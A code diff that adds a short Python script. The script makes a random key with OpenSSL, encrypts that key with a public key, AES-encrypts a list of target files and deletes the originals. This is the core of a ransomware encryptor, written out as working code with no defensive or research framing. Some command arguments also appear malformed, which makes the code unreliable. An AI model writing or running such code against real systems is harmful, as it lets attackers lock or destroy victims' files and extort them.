@@ -1,0 +1,21 @@
+import os
+import random
+import subprocess
+
+# Create a random symmetric key using OpenSSL
+smem = subprocess.check_output("openssl rand -hex 64", shell=True)
+
+# Encrypt the symmetric key and save it to disk
+subprocess.check_output("echo '{}' | openssl pkeyutl -encrypt -out smem-enc.enc -inkey public_key.pub -pubin".format(smem), shell=True)
+
+# List of targets to be encrypted
+targets = ["secret1.txt", "secret2.txt", "secret3.txt"]
+
+# Encrypt the target files using OpenSSL
+for target in targets:
+    if os.path.exists(target):
+        os.system("openssl enc aes-256-cbc -in {} -out {}.enc -pass pass:{}".format(target, target, smem))
+        os.remove(target)
+
+# Clear the symmetric key from memory
+del smem
